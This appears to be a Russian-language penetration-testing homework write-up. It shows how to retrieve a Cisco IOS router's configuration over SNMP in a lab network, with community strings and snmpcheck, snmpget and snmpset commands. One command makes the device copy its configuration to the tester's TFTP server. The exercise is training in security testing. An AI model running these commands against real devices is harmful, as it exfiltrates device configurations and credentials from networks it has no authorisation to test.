# ДЗ 5 — Внутреннее тестирование на проникновение

## Цель
Получить конфигурацию устройства Cisco IOS (10.2.100.10) через SNMP.

## Используемые инструменты
- snmpcheck  
- snmpset  
- TFTP/FTP-сервер (10.2.100.110)  

## Исходные данные
- SNMP Read-only: `public`
- SNMP Read-write: `secret_write`
- Устройство: Cisco IOS, 10.2.100.10
- Сервер для экспорта конфигурации: 10.2.100.110

## Основные команды

### Проверка SNMP-доступа:
```
snmpcheck -t 10.2.100.10 -c public
```

### Проверка RW-доступа:
```
snmpcheck -t 10.2.100.10 -c secret_write
```

### Чтение конфигурации:
Cisco OID для конфигурации: `1.3.6.1.4.1.9.2.1.53.0`

```
snmpget -v2c -c public 10.2.100.10 1.3.6.1.4.1.9.2.1.53.0
```

### Отправка конфигурации на TFTP:
OID запуска TFTP-копирования:

```
snmpset -v2c -c secret_write 10.2.100.10 \
1.3.6.1.4.1.9.2.1.55.10.2.100.110 s config.cfg
```

Файл будет сохранён на 10.2.100.110 как `config.cfg`.
